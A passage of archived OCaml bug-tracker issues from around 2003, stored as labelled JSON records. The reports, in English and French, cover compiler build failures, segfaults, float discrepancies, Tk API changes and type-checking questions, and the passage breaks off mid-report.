Node(rl, rv, rr, _) ->\n            if height rr >= height rl then\n              create (create l x rl) rv rr\n            else begin\n              match rl with\n                Empty -> invalid_arg \"Set.bal\"\n              | Node(rll, rlv, rlr, _) ->\n                  create (create l x rll) rlv (create rlr rv rr)\n            end\n      end else\n        Node(l, x, r, (if hl >= hr then hl + 1 else hr + 1))\n\n    (* Same as bal, but repeat rebalancing until the final result\n       is balanced. *)\n\n    let rec join l x r =\n      match bal l x r with\n        Empty -> invalid_arg \"Set.join\"\n      | Node(l', x', r', _) as t' ->\n          let d = height l' - height r' in\n          if d < -2 || d > 2 then join l' x' r' else t'\n\n    (* Splitting *)\n\n    let rec split x = function\n        Empty ->\n          (Empty, None, Empty)\n      | Node(l, v, r, _) ->\n          let c = Ord.compare x v in\n          if c = 0 then (l, Some v, r)\n          else if c < 0 then\n            let (ll, vl, rl) = split x l in (ll, vl, join rl v r)\n          else\n            let (lr, vr, rr) = split x r in (join l v lr, vr, rr)\n\n    (* Implementation of the set operations *)\n\n    let empty = Empty\n\n    let rec add x = function\n        Empty -> Node(Empty, x, Empty, 1)\n      | Node(l, v, r, _) as t ->\n          let c = Ord.compare x v in\n          if c = 0 then t else\n          if c < 0 then bal (add x l) v r else bal l v (add x r)\n\n    let rec union s1 s2 =\n      match (s1, s2) with\n        (Empty, t2) -> t2\n      | (t1, Empty) -> t1\n      | (Node(l1, v1, r1, h1), Node(l2, v2, r2, h2)) ->\n          if h1 >= h2 then\n            if h2 = 1 then add v2 s1 else begin\n              let (l2, _, r2) = split v1 s2 in\n              join (union l1 l2) v1 (union r1 r2)\n            end\n          else\n            if h1 = 1 then add v1 s2 else begin\n              let (l1, _, r1) = split v2 s1 in\n              join (union l1 l2) v2 (union r1 r2)\n            end\n\n(* ---------------------------------------------------------------------- *)\n(* check for AVL invariant *)\n    let check s =\n      let rec check_rec = function\n\t| Empty -> \n\t    0\n\t| Node (l, _, r, h) ->\n\t    let hl = check_rec l in\n\t    let hr = check_rec r in\n\t    assert (h = max hl hr + 1);\n\t    assert (abs (hl - hr) <= 2);\n\t    h\n      in\n      ignore (check_rec s)\n\n(* a set of n elements between min and max *)\n    let build min max n =\n      let rec build_rec acc = function\n\t| 0 -> acc\n\t| n -> build_rec (add (min + Random.int (max - min)) acc) (n - 1)\n      in\n      build_rec empty n\n\n(* wrapper for union *)\n    let union_c s1 s2 =\n      let s = union s1 s2 in\n      check s;\n      s\n\n    let _ = \n      while true do \n\tignore (union_c (build 0 10000 (Random.int 10000))\n\t\t  (build 0 1000 (Random.int 1000))) done;;\n"},{"labels":["bug"],"text":"**Original bug ID:** 1716\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christopher Dutchyn\nVersion: 3.06+ (anon cvs)\nOS: Solaris 2.9\nSubmission from: bnhu530ey3144.bc.hsia.telus.net (142.173.20.174)\n\n\nmake opt.opt\n<<< various output elided >>>\ncd ../camlp4; make optp4 OTOP=../.. CAMLP4OPT=../meta/camlp4r.opt CAMLP4M=\"-I\n../meta pa_r.cmx pa_rp.cmx pr_dump.cmx\"\n../../ocamlcompopt.sh ../odyl/odyl.cmxa camlp4.cmxa -I ../meta pa_r.cmx\npa_rp.cmx pr_dump.cmx ../odyl/odyl.cmx -linkall -o ../meta/camlp4r.opt\nFiles ../odyl/odyl.cmxa and ../../stdlib/stdlib.cmxa\nmake inconsistent assumptions over implementation Arg\n*** Error code 2\nmake: Fatal error: Command failed for target `../meta/camlp4r.opt'\n<<< more output elided >>>\n"},{"labels":["bug"],"text":"**Original bug ID:** 1715\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Alexey Shchepin\nVersion: 3.06+34 (cvs version from 2003-06-15)\nOS: Linux\nSubmission from: 62.32.54.41 (62.32.54.41)\n\n\nFollowing program prints \"4.000000\" when compiled with ocamlc and \"nan\" when\ncompiled with ocamlopt:\n\nlet m = Array.make 10 2.0\nlet sq x = x *. x\nlet _ = Printf.printf \"%f\\n\" (sq m.(1))\n"},{"labels":["bug"],"text":"**Original bug ID:** 1713\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Paul Lister\nVersion: 3.06\nOS: Windows 2000\nSubmission from: host81-134-11-122.in-addr.btopenworld.com (81.134.11.122)\n\n\nI've downloaded the binaries and installed ocaml 3.06 for Windows on my Windows\n2000 machine. \n\nThere is a directory of examples for camltk, but no camltk.cma file. Conversely\nthere is a labltk.cma file, but no examples.\n\nI have installed tcl/tk8.3.\n\nIf I link the demo hello.ml against labltk, I get an error message from the\nButton.create instruction \"This argument cannot be applied without a label\".\n\nLooks like I need the camltk library - but where can I get it?\n\nInteresting point:\n\nI have also loaded ocaml 3.06 on my Red Hat Linux machine. The cameltk library\nis also absent. However I can compile and run the demos \"hello.ml\" and\n\"camleyes.ml\" by changing the first line \n\nopen Tk;; \n\nto \n\nopen Camltk;; \n\nand then linking with the labltk library.\n\nHope you can help.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1712\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\ntags 183936 upstream\nthanks\n\nBonjour, \n\nCeci est plus exactement Adresse a Maxence.\n\nVoici un bugreport que j'ai eu pour le package debian de ocaml. Il\ns'agit d'une suite du bug report a propos de ocamldoc et whatis de\nsetpembre dernier. Je suis pas sur de bien comprendre le probleme, mais\nil me semble qu'il touche surtout les pages man des sous modules qui\nn'ont pas de description :\n\n.SH NAME\nStdLabels.List \\-\n\nalors que :\n\n.SH NAME\nList \\- List operations.\n\nAmicalement,\n\nSven Luther\n\nOn Sat, Mar 08, 2003 at 01:28:42PM +0100, Laurent Bonnaud wrote:\n> Package: ocaml\n> Version: 3.06-15\n> Severity: normal\n> \n> \n> Hi,\n> \n> here is the problem:\n> \n> $ man -k StdLabels     \n> StdLabels (o)        - Standard labeled libraries.\n> StdLabels.Array (o)  - (unknown subject)\n> StdLabels.Array - (o) [StdLabels.Array] - (unknown subject)\n> StdLabels.List (o)   - (unknown subject)\n> StdLabels.List - (o) [StdLabels.List] - (unknown subject)\n> StdLabels.String (o) - (unknown subject)\n> StdLabels.String - (o) [StdLabels.String] - (unknown subject)\n> \n> \n> -- System Information:\n> Debian Release: testing/unstable\n> Architecture: i386\n> Kernel: Linux jophur 2.4.20-686 #1 Mon Jan 13 22:22:30 EST 2003 i686\n> Locale: LANG=fr_FR@euro, LC_CTYPE=fr_FR@euro\n> \n> Versions of packages ocaml depends on:\n> ii  libc6                     2.3.1-14       GNU C Library: Shared libraries an\n> ii  libncurses5-dev           5.3.20021109-2 Developer's libraries and docs for\n> ii  ocaml-base [ocaml-base-3. 3.06-15        Runtime system for ocaml bytecode \n> \n> -- debconf information excluded\n> \n> \n>\n"},{"labels":["bug"],"text":"**Original bug ID:** 1709\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nthe newest CVS-snapshot of OCaml has an incompatibility in the\nfunction \"parse_argv\" of the Arg-module, which, for example, affects\nthe findlib-tool by Gerd Stolpmann. The function sets \"current\" to\nzero after saving its contents, thus making it impossible to parse\nargument-vectors with a different offset by setting Arg.current to a\ndifferent value. Just delete the corresponding line that sets \"current\"\nto zero, and everything should be fine again!\n\nBest regards,\nMarkus\n\n-- \nMarkus Mottl          http://www.oefai.at/~markus          markus@oefai.at\n"},{"labels":["bug"],"text":"**Original bug ID:** 1708\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI had a problem with the Ocaml interpreter segfaulting on Windows 98. \nThis is with cygwin and Ocaml 3.06.  It may be related to incoming/1702 \nwhich involves exception handling, but one particular exception in a \ncompiled module in Linux.  My problem was triggered by any exception or \nsyntax error.  After installing a debug build, I find the problem has gone!\n\nThe pre-compiled windows interpreter is okay.  I also compiled a version \nwith cygwin in Windows 2000 and that was okay.\n\nSome other things for the documentation -- executable files have to be \nnamed with the \".exe\" in Windows.  So, an example to compile a file is\n\nocamlc -o fib.exe fib.ml\n\nand to compile that debug build, I ran\n\nmake ocamlrund.exe\n\nand so on.\n\nHere's a dump I got --\n\nException: STATUS_ACCESS_VIOLATION at eip=00403444\neax=0000001B ebx=0000001B ecx=0000001B edx=5C3D7375 esi=00000000 \nedi=610AD44F\nebp=0075FB18 esp=0075FB10 program=D:\\CYGWIN\\USR\\LOCAL\\BIN\\OCAMLRUN.EXE\ncs=0167 ds=016F es=016F fs=5207 gs=0000 ss=016F\nStack trace:\nFrame     Function  Args\n0075FB18  00403444  (0000001B, 00A205F0, 0075FB48, 00000000)\n0075FB38  0041338A  (00AC0768, 00000001, 00403432, 004061C5)\n0075FB58  004034A1  (00000003, 00000017, 00000001, 0099AA24)\n0075FCE8  004108F9  (009F9948, 000C6CC4, 0040CD9E, 00000050)\n0075FD58  0040D02B  (615F2218, 00000000, 0075FDB8, 61007408)\n0075FD68  00401D33  (00000001, 615F2218, 00990328, 0075FD9C)\n0075FDB8  61007408  (610D1F58, FFFFFFFE, 00000008, 610D1E7C)\n0075FE08  610076ED  (00000000, 00000000, BFFC9490, 0075FF68)\n0075FE28  00416A42  (00401D10, 037F0500, 0075FF78, BFF8B560)\n0075FE38  0040103C  (00000000, 818B1488, 00550000, 6D61634F)\n0075FF78  BFF8B560  (818B1658, 00000008, 818B1488, 00000000)\n      87 [main] ocaml 977625 handle_exceptions: Error while dumping \nstate (probably corrupted stack)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1707\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: mattias waldau\nVersion: 3.06\nOS: cygwin\nSubmission from: h199n1fls34o849.telia.com (213.67.121.199)\n\n\nSince I develop under cygwin and deliver under win32, sometimes my filename\ndelimiters are backslash, which works fine, except for Filename.dirname.\n\nTherefor I defined the following function:\n\nlet backslash_regexp = Str.regexp_string \"\\\\\" ;;\nlet my_dirname str =\n  let res = Filename.dirname str in\n  if res = \".\" then \n    let str = Str.global_replace backslash_regexp \"/\" str in\n    Filename.dirname str\n  else res ;;\n\nMaybe Filename.dirname should behave like this?\n"},{"labels":["bug"],"text":"**Original bug ID:** 1706\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nJ'ai un de nombreux comportements Ã©tranges et des crash dans un de mes anciens programmes.\nEn fait, je du modifier ce programme car il utilisait l'ancienne version de Xml-Light ( xml.mli , xml.cmi , xml.cma ) de faÃ§on a ce qu'il utilise la nouvelle version ( xml.mli , xml.cmi , xml-light.cma ) mais j'ai oubliÃ© de modifier le nom du CMA dans le Makefile.\n\nIl se trouve de plus que j'utilise Dynlink : j'ai un executable \"boot\" linkÃ© avec divers CMA ( dont celui de XmlLight ) et \"-linkall\" qui va charger des \"plugins\" qui sont d'autre CMA.\nComme le Xml.cmi est le bon, on a bien :\n    Xml.cmi du module chargÃ© <=> Xml.cmi mis a disposition par Dynlink ( via add_interface )\npar contre la vÃ©rification :\n    Xml.cma linkÃ© <=> Xml.cmi mis a disposition n'est pas faite (as-t-on le MD5 du CMI dans le CMA d'ailleurs ?)\nDu coup... comportement particulirement troublant ( a savoir dans mon cas : une exception Invalid_argument String.create Ã©tait levÃ©e... )\n\nNicolas Cannasse\n----------------\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n<HTML><HEAD>\n<META http-equiv=Content-Type content=\"text/html; charset=iso-8859-1\">\n<META content=\"MSHTML 6.00.2800.1106\" name=GENERATOR>\n<STYLE></STYLE>\n</HEAD>\n<BODY bgColor=#ffffff>\n<DIV><FONT face=Arial size=2>Bonjour,</FONT></DIV>\n<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>J'ai un de nombreux comportements Ã©tranges et des \ncrash dans un de mes anciens programmes.</FONT></DIV>\n<DIV><FONT face=Arial size=2>En fait, je du modifier ce programme car il \nutilisait l'ancienne version de Xml-Light ( xml.mli , xml.cmi , xml.cma ) de \nfaÃ§on a ce qu'il utilise la nouvelle version ( xml.mli , xml.cmi , xml-light.cma \n) mais j'ai oubliÃ© de modifier le nom du CMA dans le Makefile.</FONT></DIV>\n<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>Il se trouve de plus que j'utilise Dynlink : j'ai \nun executable \"boot\" linkÃ© avec divers CMA ( dont celui de XmlLight ) et \n\"-linkall\" qui va charger des \"plugins\" qui sont d'autre CMA.</FONT></DIV>\n<DIV><FONT face=Arial size=2>Comme le Xml.cmi&nbsp;est le bon, on a bien \n:</FONT></DIV>\n<DIV><FONT face=Arial size=2>&nbsp;&nbsp;&nbsp; Xml.cmi du module chargÃ© \n&lt;=&gt; Xml.cmi mis a disposition par Dynlink ( via add_interface \n)</FONT></DIV>\n<DIV><FONT face=Arial size=2>par contre la vÃ©rification :</FONT></DIV>\n<DIV><FONT face=Arial size=2>&nbsp;&nbsp;&nbsp; Xml.cma linkÃ© &lt;=&gt; Xml.cmi \nmis a disposition n'est pas faite (as-t-on&nbsp;le MD5 du CMI dans le \nCMA&nbsp;d'ailleurs ?)</FONT></DIV>\n<DIV><FONT face=Arial size=2>Du coup... comportement particulirement troublant ( \na savoir dans mon cas : une exception Invalid_argument String.create Ã©tait \nlevÃ©e... )</FONT></DIV>\n<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>Nicolas Cannasse</FONT></DIV></BODY></HTML>\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1705\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Frank Dellaert\nVersion: 3.06\nOS: Linux\nSubmission from: user-11fa88c.dsl.mindspring.com (66.245.33.12)\n\n\nShort version: Random.float is probably broken in byte versions of the code.\n\nLong version: we have been seeing qualitative differences between behavior of\nbyte vs native code whenever we use Random.float. We use Caml for visual\ntracking, robot localization, and other probabilistic inference algorithms, so\nthat's pretty much all over the place. Finally, today, I replaced all our random\ngenerators with stubs to a numerical recipes random number generator, and the\nproblem went away: native and byte code now behave the same way, in what seems\nto be the correct way (like native code behaved before the patch). I can't say\nquite for sure, but I suspect your byte code random number generator is broken.\nWhy there would be any difference at all stumps me, but you might know ?\n\nI can't stress to you enough how serious this bug is, at least to my group (I\nhave at least 10 people working in Caml): we write papers with results that\nheavily depend on a correct random generator...\n\nBest of luck\nFrank Dellaert\n"},{"labels":["bug"],"text":"**Original bug ID:** 1704\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christopher Dutchyn\nVersion: ocaml-3.06+34\nOS: Solaris 2.9\nSubmission from: cypress.cs.ubc.ca (142.103.11.23)\n\n\nThere is an extra blank line in the Makefile for the emacs mode.  FreeBSD\ndoesn't\nseem to care, but Solaris does.  Here's the details:\n\ninstall-ocamltags: ocamltags\n                                                    !!! why is this here?\n\tcp ocamltags $(SCRIPTDIR)/ocamltags\n\nChris D.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1702\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nJe viens de dÃ©couvrir Ã§a:\n(sur Linux)\n   $ /usr/local/adm/src/caml/bin/cashr\n\t   Objective Caml version 3.06+34 (2003-05-21)\n\n\t   Camlp4s Parsing version 3.06+34\n\n   # Cash.host_info_name \"dixie\";\n   Segmentation fault\n(Sur Linux, Solaris, Dec alpha)\n   3 /usr/local/bin/cashr (version moins rÃ©cente de cash)\n\t   Objective Caml version 3.06\n\n\t   Camlp4 Parsing version 3.06\n\n   # Cash.host_info_name \"dixie\";\n   Segmentation fault\nComme dixie n'est pas dans le DNS, Ã§a lÃ¨ve une exception\n Cash.Netdb_error HOST_NOT_FOUND\nqui semble provoquer le seg fault quand ocamlrun tente de l'imprimer ?\n(Un try autour de l'appel Ã  host_info_name fonctionne trÃ¨s bien).\n\nCe que je ne comprend pas du tout: j'ai observÃ© Ã§a dans un script cash (en\ncompilÃ© byte-code, c'est pareil).  Hors j'ai un autre script auquel il\nmanquait aussi un try autour de host_info_name, et Ã§a imprimait parfaitement\nl'exception (mais il est peut-Ãªtre suffisant de reproduire le seg fault\nci-dessus ?)\n\nBruno.\n\nPS: gdb ne me donne pas beaucoup d'info:\n3 gdb /usr/local/adm/src/caml/csl/byterun/ocamlrund core\n\nwarning: core file may not match specified executable file.\nCore was generated by `/usr/local/adm/src/caml/csl/byterun/ocamlrund /usr/local/adm/src/cash/cashrtop'.\nProgram terminated with signal 11, Segmentation fault.\nReading symbols from [un paquet de .so]...done.\n#0  0x0805f87b in obj_tag (arg=134540081) at obj.c:51\n51        return Val_int(Tag_val(arg));\ngdb:bt\n#0  0x0805f87b in obj_tag (arg=134540081) at obj.c:51\n#1  0x08066878 in interprete (prog=0x11, prog_size=100) at interp.c:846\n"},{"labels":["bug"],"text":"**Original bug ID:** 1701\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\nje ne comprends pas pourquoi ce code n'est pas correctement exÃ©cutÃ© :\nil s'agit de l'implÃ©mentation d'une boucle for de faÃ§on rÃ©cursive :\n\n\nlet rec my_for=function borne_i -> function borne_s ->function \nexpression ->\n\t expression;\n\t  if (borne_i<borne_s) then (\n\t    print_int(i);\n\t    my_for  borne_i (borne_s-1) expression );;\n\n\net quand je l'Ã©xecute avec my_for 0 9 (print_string(\"djame\"));;\nj'obtiens :\n\ndjame987654321- : unit =\n\nManifestement, vu qu'on affiche les indices, on effectue bien 9 appels \nrÃ©cursifs donc on devrait voir s'executer 9 fois le bloc \"expression\"\nor ca n'a lieu qu'une seule fois.\nJ'ai beau chercher je ne vois pas pourquoi ca a ce comportement.\n\nSi vous pouviez me donner une indication, ca serait vraiment trÃ©s gentil.\n\n\nCordialement,\n\nDjamÃ©\n\n\n-- \nDjamÃ© Seddah\nLORIA / Campus Scientifique\nBP239\nF-54506 VANDOEUVRE-LES-NANCY CEDEX\nFRANCE\ntel : 00 33 3 83 59 20 47 / fax : 00 33 3 83 41 30 79\n"},{"labels":["bug"],"text":"**Original bug ID:** 1700\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Boris Yakobowski\nVersion: 3.06+34\nOS: Linux\nSubmission from: lyon-4-a7-62-147-110-225.dial.proxad.net (62.147.110.225)\n\n\nBonjour.        \n                                                     \nDaniel avait corrigÃ© Ã  ma demande dans la version cvs de Camlp4 les fichiers\npr_o.ml et pr_r.ml pour permettre le pretty-printing de foncteurs d'ordre\nsupÃ©rieur (avec la version actuelle de camlp4 dans le cvs de ocaml, le code\nrÃ©sultant est pour le moment parsemÃ© de not_impl). Il pourrait Ãªtre\nintÃ©ressant d'appliquer ces patchs pour la prochaine version de Ocaml.\n\nVoilÃ  les liens cvsweb pour les gÃ©nÃ©rer :\n                                            \nhttp://camlcvs.inria.fr/cgi-bin/cvsweb.cgi/camlp4/etc/pr_r.ml.diff?r1=3.70&r2=3\nhttp://camlcvs.inria.fr/cgi-bin/cvsweb.cgi/camlp4/etc/pr_o.ml.diff?r1=3.68&r2=3\n\nAmicalement,\n                \n-- \nBoris Yakobowski\n"},{"labels":["bug"],"text":"**Original bug ID:** 1699\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christopher Dutchyn\nVersion: 3.06+27 (anon-cvs)\nOS: FreeBSD\nSubmission from: bnhu530ey3144.bc.hsia.telus.net (142.173.20.174)\n\n\nCompilation of asmrun/signals.c fails with warnings of incomplete types and\nsyntax errors in <sys/resources.h>, eventually failing with \"missing field\nrlim_cur\" in line 566 of signals.c.  The problem is that struct timeval is\nnot defined yet because the appropriate include file is not present yet.\nA patch is attached:\n\n*** sig.c       Sun Jun  1 14:15:52 2003\n--- signals.c   Sun Jun  1 13:59:17 2003\n***************\n*** 29,34 ****\n--- 29,35 ----\n  #include \"stack.h\"\n  #include \"sys.h\"\n  #ifdef HAS_STACK_OVERFLOW_DETECTION\n+ #include <sys/time.h>         /* CJD for FreeBSD 5 */\n  #include <sys/resource.h>\n  #endif\n\nChris D.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1698\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n===== BROKEN CODE REPORT =====\n\nI've experinenced two major bugs in the code that was supplied by: \nhttp://caml.inria.fr/\nThe so called \"stable release\", has bug in the invocation of Tk instructions, \nto ba accurate in one of them: Tk_PhotoPutBlock\n\nIt seems (this information wasn't checked) that newer releases of gcc (gcc GNU \ncompiler) comes with new header files that change the beahviour of \nTk_PhotoPutBlock function. New Tk_PhotoPutBlock function requires as input 7 \narguments - not 6. If it's needed function to work as previously the 7th \nparameter should be TK_PHOTO_COMPOSITE_OVERLAY. I found out that in whole \ncode this function is used 2 times, I was realy in need of Calm 3.06 so I \npatched the code - hit new release (3.062) at \nhttp://80-51-48-94.cable-modem.tkk.net.pl/\n\nFor more info see:\nman Tk_PhotoPutBlock function (newest version avaiable *bug site* - read on)\nhttp://80-51-48-94.cable-modem.tkk.net.pl/ - bug site (with fresh code)\n\nThis is constructive criticism - don't wan't to make anyone angry.\nI_v0\n-- \nLinux RoD 2.4.20-grsec #4 Sun May 25 20:11:45 CEST 2003 i686 unknown\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1697\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for Caml light use https://github.com/camllight/camllight/issues\n\n## Bug description\n\nBonjour,\n\nSur une Sun Ultra60 (sparc-sun-solaris2.7), avec gcc-3.1, je compile la\nderniere version de caml-light sans probleme. Sauf que l'environnement\ninteractif que j'obtiens est allergique aux nombres flottants :\n\n>       Caml Light version 0.75\n#let f(a,b,c) = if b*.b-.4.*.a*.c>.0. then true else false;;\nf : float * float * float -> bool = <fun>\n#f(1.,0.,0.);;\nBus error\n\nmeme resultat avec la version 0.74 de caml-light :\n\n>       Caml Light version 0.74\n#2.;;\nBus Error (core dumped)\n\nEn utilisant gcc-2.95.2 lors de la compilation de caml-light, ca se\npasse nettement mieux :\n\n>       Caml Light version 0.75\n#2.;;\n- : float = 2.0\n\nCordialement,\n-- \nNicolas Rougnon-Glasson             Tel: +33 4 76 58 64 31\nSTMicroelectronics                  Fax: +33 4 76 58 41 23\n12, rue Jules Horowitz - B.P. 217   email:\nnicolas.rougnon-glasson@st.com\nF-38019 Grenoble Cedex              www: http://www.st.com\n"},{"labels":["bug"],"text":"**Original bug ID:** 1695\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nSome problems using variants in compilation mode:\n\n\n# let l = [`B] @ [`A];;\nval l : _[> `A | `B] list = [`B; `A]\n\nis what I am expecting in the top level loop\n\nbut the compilation with ocamlc give:\n\nThe type of this expression, _[> `A | `B] list,\ncontains type variables that cannot be generalized\n\nIs it normal?\nIf yes, is there some documentation?\n"},{"labels":["bug"],"text":"**Original bug ID:** 1694\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Sylvain Baro\nVersion: 3.06\nOS: FreeBSD 4-STABLE\nSubmission from: arsenic.pps.jussieu.fr (134.157.168.33)\n\n\nLe profiling en temps (en utilisant ocamlopt et gprof) ne fonctionne pas sous\nFreeBSD 4-STABLE. Un fichier de profil est effectivement engendrÃ© mais il ne\ncontient que des rÃ©fÃ©rences aux fonctions de bas niveau. La mÃªme manipulation\neffectuÃ©e sous Linux fonctionne comme attendu, et fournit le rÃ©sultat pour les\nfonctions dÃ©finies dans mes modules.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1692\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjours,\n\nSuite a un message rÃ©cent sur la mailing list, j'ai voulue trouver ce\nqu'il fallait pour qu'une application partielle de kprintf donne un\ntype polymorphe, et je suis tombÃ© sur une Ã©trangetÃ© : \n\n        Objective Caml version 3.06+31 (2003-05-02)\n\n# type (-'a, 'b, 'c, 'd) my_format;;\ntype (-'a, 'b, 'c, 'd) my_format\n# let from_my (x: ('a, 'b, 'c, 'd) my_format) =\n    (Obj.magic x :('a, 'b, 'c, 'd)format);;\nval from_my : ('a, 'b, 'c, 'd) my_format -> ('a, 'b, 'c, 'd) format = <fun>\n# let to_my (x :('a, 'b, 'c, 'd)format) = \n    (Obj.magic x:('a, 'b, 'c, 'd) my_format);;\nval to_my : ('a, 'b, 'c, 'd) format -> ('a, 'b, 'c, 'd) my_format = <fun>\n# let mykprintf k fo = Printf.kprintf k (from_my fo);;\nval mykprintf : (string -> 'a) -> ('b, unit, string, 'a) my_format -> 'b =\n  <fun>\n# let m = mykprintf (fun s -> prerr_endline s);;\nval m : ('_a, unit, string, unit) my_format -> '_a = <fun>\n# type 'a t = ('a, unit, string, unit) my_format -> 'a;;\ntype 'a t = ('a, unit, string, unit) my_format -> 'a\n# let (m: 'a t) = mykprintf (fun s -> prerr_endline s);;\nval m : 'a t = <fun>\n# \n\nOn voit que l'application partielle de mykrintf donne un type\npolymorphique faible alors que si on la type explicitement, Ã  l'aide\nd'un type nommÃ©, cela devient un type polymorphique complet. \n\nIl semble donc que l'algorithme utilisÃ© pour dÃ©tecter la covariance ne\nsoit pas le mÃªme pour dÃ©cider de la distinction typage fort/typage\nfaible dans le cas d'une application partielle que dans le cas d'une\ndÃ©finition du type.\n\nPs: mon message n'implique en aucun cas que je pense que format\ndevrais Ãªtre contravariant en son premier argument. J'en sais rien,\nc'Ã©tait juste un test\n\n-- \nRÃ©mi Vanicat\nvanicat@labri.u-bordeaux.fr\nhttp://dept-info.labri.u-bordeaux.fr/~vanicat\n"},{"labels":["bug"],"text":"**Original bug ID:** 1690\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Laurent Vibert\nVersion: CVS 3.06+32\nOS: linux\nSubmission from: cafe.irisa.fr (131.254.22.19)\n\n\nBonjour,\n\ndans le code de la version CVS, apparaÃ®t le format %r qui en l'Ã©tat ne marche\npas :\n\ncafe[16:21]%lcaml \n        Objective Caml version 3.06+32 (2003-05-13)\n\n# Scanf.scanf \"%r\" (fun x r -> x) (fun s -> 0);;\nSegmentation fault\n"},{"labels":["bug"],"text":"**Original bug ID:** 1689\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Laurent Vibert\nVersion: CVS 3.06+32\nOS: linux\nSubmission from: cafe.irisa.fr (131.254.22.19)\n\n\nBonjour,\n\ndans le code de la version CVS, apparaÃ®t le format %r qui en l'Ã©tat ne marche\npas :\n\ncafe[16:21]%lcaml \n        Objective Caml version 3.06+32 (2003-05-13)\n\n# Scanf.scanf \"%r\" (fun x r -> x) (fun s -> 0);;\nSegmentation fault\n"},{"labels":["bug"],"text":"**Original bug ID:** 1688\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nprojet en ocaml\ndont une archive *.tar.gz est joint Ã  cet email.\n\nOcaml : v 3.06\n\nOS : OpenBSD3.3\n\nrÃ©pertoires :\n src/   sources OCaml\n test/  fichier de test\n\n src/main.ml est le fichier principal\n\ncompilation :\n dans src/ :\n $ gmake -f Makefile_ocaml.tpl \n\nla commande pour lancer le programme est (Ã  partir du\nrÃ©pertoire src) :\n ./a.out <un_fichier_de_test>\n\nExemple : \n\nla commade suivante ne fonctionne pour mon projet :\n ./a.out  ../test/test6\nla commade suivante ne fonctionne pas pour mon projet\n:\n ./a.out  ../test/test7\n\nje voulais donc dÃ©bugger la commande :\n ./a.out  